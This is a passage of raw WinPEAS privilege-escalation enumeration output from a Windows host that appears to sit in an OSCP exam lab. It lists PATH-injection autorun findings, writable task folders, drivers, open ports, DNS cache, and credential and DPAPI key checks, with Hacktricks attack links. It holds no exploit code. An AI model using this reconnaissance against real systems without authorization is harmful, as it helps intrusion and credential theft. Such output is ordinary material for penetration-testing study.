    Folder: None (PATH Injection)
    File: msvidc32.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.uyvy
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yuy2
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvu9
    Folder: None (PATH Injection)
    File: tsbyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: vidc.yvyu
    Folder: None (PATH Injection)
    File: msyuv.dll
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Drivers32
    Key: wavemapper
    Folder: None (PATH Injection)
    File: msacm32.drv
   =================================================================================================


    RegPath: HKLM\Software\Classes\htmlfile\shell\open\command
    Folder: C:\Program Files\Internet Explorer
    File: C:\Program Files\Internet Explorer\iexplore.exe %1 (Unquoted and Space detected) - C:\
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wow64cpu
    Folder: None (PATH Injection)
    File: wow64cpu.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _wowarmhw
    Folder: None (PATH Injection)
    File: wowarmhw.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: _xtajit
    Folder: None (PATH Injection)
    File: xtajit.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: advapi32
    Folder: None (PATH Injection)
    File: advapi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: clbcatq
    Folder: None (PATH Injection)
    File: clbcatq.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: combase
    Folder: None (PATH Injection)
    File: combase.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: COMDLG32
    Folder: None (PATH Injection)
    File: COMDLG32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: coml2
    Folder: None (PATH Injection)
    File: coml2.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: DifxApi
    Folder: None (PATH Injection)
    File: difxapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdi32
    Folder: None (PATH Injection)
    File: gdi32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: gdiplus
    Folder: None (PATH Injection)
    File: gdiplus.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMAGEHLP
    Folder: None (PATH Injection)
    File: IMAGEHLP.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: IMM32
    Folder: None (PATH Injection)
    File: IMM32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: kernel32
    Folder: None (PATH Injection)
    File: kernel32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSCTF
    Folder: None (PATH Injection)
    File: MSCTF.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: MSVCRT
    Folder: None (PATH Injection)
    File: MSVCRT.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NORMALIZ
    Folder: None (PATH Injection)
    File: NORMALIZ.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: NSI
    Folder: None (PATH Injection)
    File: NSI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: ole32
    Folder: None (PATH Injection)
    File: ole32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: OLEAUT32
    Folder: None (PATH Injection)
    File: OLEAUT32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: PSAPI
    Folder: None (PATH Injection)
    File: PSAPI.DLL
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: rpcrt4
    Folder: None (PATH Injection)
    File: rpcrt4.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: sechost
    Folder: None (PATH Injection)
    File: sechost.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: Setupapi
    Folder: None (PATH Injection)
    File: Setupapi.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHCORE
    Folder: None (PATH Injection)
    File: SHCORE.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHELL32
    Folder: None (PATH Injection)
    File: SHELL32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: SHLWAPI
    Folder: None (PATH Injection)
    File: SHLWAPI.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: user32
    Folder: None (PATH Injection)
    File: user32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WLDAP32
    Folder: None (PATH Injection)
    File: WLDAP32.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64
    Folder: None (PATH Injection)
    File: wow64.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: wow64win
    Folder: None (PATH Injection)
    File: wow64win.dll
   =================================================================================================


    RegPath: HKLM\System\CurrentControlSet\Control\Session Manager\KnownDlls
    Key: WS2_32
    Folder: None (PATH Injection)
    File: WS2_32.dll
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{2C7339CF-2B09-4501-B3F3-F3508C9228ED}
    Key: StubPath
    Folder: \
    FolderPerms: Users [Allow: AppendData/CreateDirectories]
    File: /UserInstall
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4340}
    Key: StubPath
    Folder: None (PATH Injection)
    File: U
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89820200-ECBD-11cf-8B85-00AA005B4383}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\ie4uinit.exe -UserConfig
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\Rundll32.exe C:\Windows\System32\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\System32
    File: C:\Windows\System32\rundll32.exe C:\Windows\System32\iesetup.dll,IEHardenUser
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{6BF52A52-394A-11d3-B153-00C04F79FAA6}
    Key: StubPath
    Folder: C:\Windows\system32
    File: C:\Windows\system32\unregmp2.exe /FirstLogon
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{89B4C1CD-B018-4511-B0A1-5476DBF70820}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\Rundll32.exe C:\Windows\SysWOW64\mscories.dll,Install
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A7-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenAdmin
   =================================================================================================


    RegPath: HKLM\Software\Wow6432Node\Microsoft\Active Setup\Installed Components\{A509B1A8-37EF-4b3f-8CFC-4F3A74704073}
    Key: StubPath
    Folder: C:\Windows\SysWOW64
    File: C:\Windows\SysWOW64\rundll32.exe C:\Windows\SysWOW64\iesetup.dll,IEHardenUser
   =================================================================================================


    Folder: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    File: C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
    FolderPerms: b.martin [Allow: AllAccess]
    File: C:\Users\b.martin\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini (Unquoted and Space detected) - C:\Users\b.martin\AppData\Roaming\Microsoft\Windows
    FilePerms: b.martin [Allow: AllAccess]
    Potentially sensitive file content: LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21787
   =================================================================================================


    Folder: C:\windows\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows\system32\tasks
    FolderPerms: Authenticated Users [Allow: WriteData/CreateFiles]
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\system.ini
   =================================================================================================


    Folder: C:\windows
    File: C:\windows\win.ini
   =================================================================================================


    Key: From WMIC
    Folder: C:\Program Files\VMware\VMware Tools
    File: C:\Program Files\VMware\VMware Tools\vmtoolsd.exe -n vmusr
   =================================================================================================


╔══════════╣ Scheduled Applications --Non Microsoft--
╚ Check if you can modify other users scheduled binaries https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/privilege-escalation-with-autorun-binaries.html

╔══════════╣ Device Drivers --Non Microsoft--
╚ Check 3rd party drivers for known vulnerabilities/rootkits. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#drivers
    QLogic Gigabit Ethernet - 7.12.31.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxvbda.sys
    QLogic 10 GigE - 7.13.65.105 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\evbda.sys
    QLogic FastLinQ Ethernet - 8.33.20.103 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qevbda.sys
    NVIDIA nForce(TM) RAID Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvraid.sys
    VMware vSockets Service - 9.8.19.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsock.sys
    VMware PCI VMCI Bus Device - 9.8.18.0 build-18956547 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmci.sys
    Intel Matrix Storage Manager driver - 8.6.2.1019 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorV.sys
     Promiser SuperTrak EX Series -  5.1.0000.10 [Promise Technology, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\stexstor.sys
    LSI 3ware RAID Controller - WindowsBlue [LSI]: \\.\GLOBALROOT\SystemRoot\System32\drivers\3ware.sys
    AHCI 1.3 Device Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsata.sys
    Storage Filter Driver - 1.1.3.277 [Advanced Micro Devices]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdxata.sys
    AMD Technology AHCI Compatible Controller - 3.7.1540.43 [AMD Technologies Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\amdsbs.sys
    Adaptec RAID Controller - 7.5.0.32048 [PMC-Sierra, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\arcsas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ItSas35i.sys
    LSI Fusion-MPT SAS Driver (StorPort) - 1.34.03.83 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas2i.sys
    Windows (R) Win 7 DDK driver - 10.0.10011.16384 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sas3i.sys
    LSI SSS PCIe/Flash Driver (StorPort) - 2.10.61.81 [LSI Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\lsi_sss.sys
    MEGASAS RAID Controller Driver for Windows - 6.706.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas.sys
    MEGASAS RAID Controller Driver for Windows - 6.714.05.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\MegaSas2i.sys
    MEGASAS RAID Controller Driver for Windows - 7.705.08.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasas35i.sys
    MegaRAID Software RAID - 15.02.2013.0129 [LSI Corporation, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\megasr.sys
    Marvell Flash Controller -  1.0.5.1016  [Marvell Semiconductor, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\mvumis.sys
    NVIDIA nForce(TM) SATA Driver - 10.6.0.23 [NVIDIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\nvstor.sys
    MEGASAS RAID Controller Driver for Windows - 6.805.03.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas2i.sys
    MEGASAS RAID Controller Driver for Windows - 6.604.06.00 [Avago Technologies]: \\.\GLOBALROOT\SystemRoot\System32\drivers\percsas3i.sys
    Microsoftr Windowsr Operating System - 2.60.01 [Silicon Integrated Systems Corp.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SiSRaid2.sys
    Microsoftr Windowsr Operating System - 6.1.6918.0 [Silicon Integrated Systems]: \\.\GLOBALROOT\SystemRoot\System32\drivers\sisraid4.sys
    VIA RAID driver - 7.0.9600,6352 [VIA Technologies Inc.,Ltd]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vsmraid.sys
    VIA StorX RAID Controller Driver - 8.0.9200.8110 [VIA Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vstxraid.sys
    Chelsio Communications iSCSI Controller - 10.0.10011.16384 [Chelsio Communications]: \\.\GLOBALROOT\SystemRoot\System32\drivers\cht4sx64.sys
    Intel(R) Rapid Storage Technology driver (inbox) - 15.44.0.1010 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\iaStorAVC.sys
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadfcoei.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.0.247.8000 01/26/2016 WS2K12 64 bit x64 [Emulex]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxfcoe.sys
    Emulex WS2K12 Storport Miniport Driver x64 - 11.4.225.8009 11/15/2017 WS2K12 64 bit x64 [Broadcom]: \\.\GLOBALROOT\SystemRoot\System32\drivers\elxstor.sys
    QLogic iSCSI offload driver - 8.33.5.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qeois.sys
    QLogic Fibre Channel Stor Miniport Driver - 9.1.15.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql2300i.sys
    QLA40XX iSCSI Host Bus Adapter - 2.1.5.0 (STOREx wx64) [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ql40xx2i.sys
    QLogic FCoE Stor Miniport Inbox Driver - 9.1.11.3 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qlfcoei.sys
    PMC-Sierra HBA Controller - 1.3.0.10769 [PMC-Sierra]: \\.\GLOBALROOT\SystemRoot\System32\drivers\ADP80XX.SYS
    QLogic BR-series FC/FCoE HBA Stor Miniport Driver - 3.2.26.1 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bfadi.sys
    Smart Array SAS/SATA Controller Media Driver - 8.0.4.0 Build 1 Media Driver (x86-64) [Hewlett-Packard Company]: \\.\GLOBALROOT\SystemRoot\System32\drivers\HpSAMD.sys
    VMware PVSCSI StorPort driver (64-bit) - 1.3.25.0 build-19569981 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\pvscsi.sys
    SmartRAID, SmartHBA PQI Storport Driver - 1.50.0.0 [Microsemi Corportation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\SmartSAMD.sys
    VMware Guest Introspection Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vsepflt.sys
    QLogic FCoE offload driver - 8.33.4.2 [Cavium, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\qefcoe.sys
    QLogic iSCSI offload driver - 7.14.7.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxois.sys
    QLogic FCoE Offload driver - 7.14.15.2 [QLogic Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\bxfcoe.sys
    VMware Raw Disk Helper Driver - 1.1.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmrawdsk.sys
    VMware Guest Introspection WFP Network Filter Driver - 12.1.0.0 build-19947491 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vnetWFP.sys
    VMware Pointing PS/2 Device Driver - 12.5.12.0 build-18967789 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\System32\drivers\vmmouse.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp_loader.sys
    VMware SVGA 3D - 9.17.04.0001 - build-20112898 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vm3dmp.sys
    VMware server memory controller - 7.5.7.0 build-18933738 [VMware, Inc.]: \\.\GLOBALROOT\SystemRoot\system32\DRIVERS\vmmemctl.sys
    Intel(R) Gigabit Adapter - 12.15.22.6 [Intel Corporation]: \\.\GLOBALROOT\SystemRoot\System32\drivers\e1i63x64.sys


════════════════════════════════════╣ Network Information ╠════════════════════════════════════

╔══════════╣ Network Shares
    ADMIN$ (Path: C:\Windows)
    C$ (Path: C:\)
    IPC$ (Path: )

╔══════════╣ Enumerate Network Mapped Drives (WMI)

╔══════════╣ Host File

╔══════════╣ Network Ifaces and known hosts
╚ The masks are only for the IPv4 addresses 
    Ethernet1[00:50:56:8A:49:51]: 172.16.104.202 / 255.255.255.0
        Gateways: 172.16.104.254
        DNSs: 172.16.104.200
        Known hosts:
          172.16.104.200        00-50-56-8A-A4-35     Dynamic
          172.16.104.206        00-50-56-8A-09-6C     Dynamic
          172.16.104.254        00-00-00-00-00-00     Invalid
          172.16.104.255        FF-FF-FF-FF-FF-FF     Static
          224.0.0.22            01-00-5E-00-00-16     Static
          224.0.0.251           01-00-5E-00-00-FB     Static
          224.0.0.252           01-00-5E-00-00-FC     Static

    Loopback Pseudo-Interface 1[]: 127.0.0.1, ::1 / 255.0.0.0
        DNSs: fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1
        Known hosts:
          224.0.0.22            00-00-00-00-00-00     Static


╔══════════╣ Current TCP Listening Ports
╚ Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name

  TCP        0.0.0.0               135           0.0.0.0               0               Listening         872             svchost
  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               1433          0.0.0.0               0               Listening         4104            sqlservr
  TCP        0.0.0.0               3389          0.0.0.0               0               Listening         248             svchost
  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               8080          0.0.0.0               0               Listening         4268            java
  TCP        0.0.0.0               47001         0.0.0.0               0               Listening         4               System
  TCP        0.0.0.0               49664         0.0.0.0               0               Listening         500             wininit
  TCP        0.0.0.0               49665         0.0.0.0               0               Listening         1132            svchost
  TCP        0.0.0.0               49666         0.0.0.0               0               Listening         1688            svchost
  TCP        0.0.0.0               49667         0.0.0.0               0               Listening         644             lsass
  TCP        0.0.0.0               49668         0.0.0.0               0               Listening         2328            svchost
  TCP        0.0.0.0               49669         0.0.0.0               0               Listening         644             lsass
  TCP        0.0.0.0               49670         0.0.0.0               0               Listening         624             services
  TCP        127.0.0.1             1434          0.0.0.0               0               Listening         4104            sqlservr
  TCP        172.16.104.202        139           0.0.0.0               0               Listening         4               System
  TCP        172.16.104.202        3389          172.16.104.206        58718           Established       248             svchost
  TCP        172.16.104.202        57667         172.16.104.206        445             Established       4               System
  TCP        172.16.104.202        57668         172.16.104.206        445             Established       4               System
  TCP        172.16.104.202        57669         172.16.104.206        445             Established       4               System
  TCP        172.16.104.202        57670         172.16.104.206        445             Established       4               System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address                              Remote Port     State             Process ID      Process Name

  TCP        [::]                                        135           [::]                                        0               Listening         872             svchost
  TCP        [::]                                        445           [::]                                        0               Listening         4               System
  TCP        [::]                                        1433          [::]                                        0               Listening         4104            sqlservr
  TCP        [::]                                        3389          [::]                                        0               Listening         248             svchost
  TCP        [::]                                        5985          [::]                                        0               Listening         4               System
  TCP        [::]                                        8080          [::]                                        0               Listening         4268            java
  TCP        [::]                                        47001         [::]                                        0               Listening         4               System
  TCP        [::]                                        49664         [::]                                        0               Listening         500             wininit
  TCP        [::]                                        49665         [::]                                        0               Listening         1132            svchost
  TCP        [::]                                        49666         [::]                                        0               Listening         1688            svchost
  TCP        [::]                                        49667         [::]                                        0               Listening         644             lsass
  TCP        [::]                                        49668         [::]                                        0               Listening         2328            svchost
  TCP        [::]                                        49669         [::]                                        0               Listening         644             lsass
  TCP        [::]                                        49670         [::]                                        0               Listening         624             services
  TCP        [::1]                                       1434          [::]                                        0               Listening         4104            sqlservr

╔══════════╣ Current UDP Listening Ports
╚ Check for services restricted from the outside 
  Enumerating IPv4 connections

  Protocol   Local Address         Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        0.0.0.0               123           *:*                            8                 svchost
  UDP        0.0.0.0               500           *:*                            2544              svchost
  UDP        0.0.0.0               3389          *:*                            248               svchost
  UDP        0.0.0.0               4500          *:*                            2544              svchost
  UDP        0.0.0.0               5353          *:*                            1124              svchost
  UDP        0.0.0.0               5355          *:*                            1124              svchost
  UDP        127.0.0.1             54038         *:*                            1424              svchost
  UDP        127.0.0.1             54907         *:*                            2228              svchost
  UDP        127.0.0.1             61399         *:*                            644               lsass
  UDP        127.0.0.1             64027         *:*                            6872              C:\Users\b.martin\WinPEASx64.exe
  UDP        172.16.104.202        137           *:*                            4                 System
  UDP        172.16.104.202        138           *:*                            4                 System

  Enumerating IPv6 connections

  Protocol   Local Address                               Local Port    Remote Address:Remote Port     Process ID        Process Name

  UDP        [::]                                        123           *:*                            8                 svchost
  UDP        [::]                                        500           *:*                            2544              svchost
  UDP        [::]                                        3389          *:*                            248               svchost
  UDP        [::]                                        4500          *:*                            2544              svchost

╔══════════╣ Firewall Rules
╚ Showing only DENY rules (too many ALLOW rules always) 
    Current Profiles: PUBLIC
    FirewallEnabled (Domain):    True
    FirewallEnabled (Private):    True
    FirewallEnabled (Public):    True
    DENY rules:
  [X] Exception: Object reference not set to an instance of an object.

╔══════════╣ DNS cached --limit 70--
    Entry                                 Name                                  Data
    dc20.oscp.exam                        dc20.oscp.exam                        172.16.104.200
    dc20.oscp.exam                        dc20.oscp.exam                        172.16.104.200
    _ldap._tcp.pdc._msdcs.oscp.exam       _ldap._tcp.pdc._msdcs.oscp.exam       dc20.oscp.exam 0 100 389
    _ldap._tcp.pdc._msdcs.oscp.exam       dc20.oscp.exam                        172.16.104.200
    ...-name._sites.gc._msdcs.oscp.exam   ...-Name._sites.gc._msdcs.oscp.exam   dc20.oscp.exam 0 100 3268
    ...-name._sites.gc._msdcs.oscp.exam   dc20.oscp.exam                        172.16.104.200

╔══════════╣ Enumerating Internet settings, zone and proxy configuration
  General Settings
  Hive        Key                                       Value
  HKCU        DisableCachingOfSSLPages                  1
  HKCU        IE5_UA_Backup_Flag                        5.0
  HKCU        PrivacyAdvanced                           1
  HKCU        SecureProtocols                           2688
  HKCU        User Agent                                Mozilla/4.0 (compatible; MSIE 8.0; Win32)
  HKCU        CertificateRevocation                     1
  HKCU        ZonesSecurityUpgrade                      System.Byte[]
  HKCU        WarnonZoneCrossing                        1
  HKLM        ActiveXCache                              C:\Windows\Downloaded Program Files
  HKLM        CodeBaseSearchPath                        CODEBASE
  HKLM        EnablePunycode                            1
  HKLM        MinorVersion                              0
  HKLM        WarnOnIntranet                            1

  Zone Maps
  No URLs configured

  Zone Auth Settings
  No Zone Auth Settings

╔══════════╣ Internet Connectivity
╚ Checking if internet access is possible via different methods 
    HTTP (80) Access: Not Accessible
  [X] Exception:       Error: A task was canceled.
    HTTPS (443) Access: Not Accessible
  [X] Exception:       Error: TCP connect timed out
    HTTPS (443) Access by Domain Name: Not Accessible
  [X] Exception:       Error: A task was canceled.
    DNS (53) Access: Not Accessible
  [X] Exception:       Error: A connection attempt failed because the connected party did not properly respond after a period of time, or established connection failed because connected host has failed to respond
    ICMP (ping) Access: Not Accessible
  [X] Exception:       Error: Ping failed: TimedOut

╔══════════╣ Hostname Resolution
╚ Checking if the hostname can be resolved externally 
  [X] Exception:     Error during hostname check: An error occurred while sending the request.


════════════════════════════════════╣ Active Directory Quick Checks ╠════════════════════════════════════

╔══════════╣ gMSA readable managed passwords
╚ Look for Group Managed Service Accounts you can read (msDS-ManagedPassword) https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/gmsa.html
  [-] No gMSA with readable managed password found (checked 0).

╔══════════╣ AD CS misconfigurations for ESC
╚  https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates.html
╚ Check for ADCS misconfigurations in the local DC registry
  [-] Host is not a domain controller. Skipping ADCS Registry check
╚ 
If you can modify a template (WriteDacl/WriteOwner/GenericAll), you can abuse ESC4
  [-] No templates with dangerous rights found (checked 0).


════════════════════════════════════╣ Cloud Information ╠════════════════════════════════════
Learn and practice cloud hacking in training.hacktricks.xyz
AWS EC2?                                No   
Azure VM?                               No   
Azure Tokens?                           No   
Google Cloud Platform?                  No   
Google Workspace Joined?                No   
Google Cloud Directory Sync?            No   
Google Password Sync?                   No   


════════════════════════════════════╣ Windows Credentials ╠════════════════════════════════════

╔══════════╣ Checking Windows Vault
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
    Not Found

╔══════════╣ Checking Credential manager
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#credentials-manager--windows-vault
    [!] Warning: if password contains non-printable characters, it will be printed as unicode base64 encoded string


  [!] Unable to enumerate credentials automatically, error: 'Win32Exception: System.ComponentModel.Win32Exception (0x80004005): Element not found'
Please run: 
cmdkey /list

╔══════════╣ Saved RDP connections
    Not Found

╔══════════╣ Remote Desktop Server/Client Settings
  RDP Server Settings
    Network Level Authentication            :       
    Block Clipboard Redirection             :       
    Block COM Port Redirection              :       
    Block Drive Redirection                 :       
    Block LPT Port Redirection              :       
    Block PnP Device Redirection            :       
    Block Printer Redirection               :       
    Allow Smart Card Redirection            :       

  RDP Client Settings
    Disable Password Saving                 :       True
    Restricted Remote Administration        :       False

╔══════════╣ Recently run commands
    a: powershell\1
    MRUList: ba
    b: notepad\1

╔══════════╣ Checking for DPAPI Master Keys
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    MasterKey: C:\Users\b.martin\AppData\Roaming\Microsoft\Protect\S-1-5-21-2481101513-2954867870-2660283483-1104\3bb1e62b-bbf1-4f5b-9a3f-a0b8e6886920
    Accessed: 2/22/2026 5:32:13 AM
    Modified: 2/22/2026 5:32:13 AM
   =================================================================================================


╔══════════╣ Checking for DPAPI Credential Files
╚  https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#dpapi
    Not Found

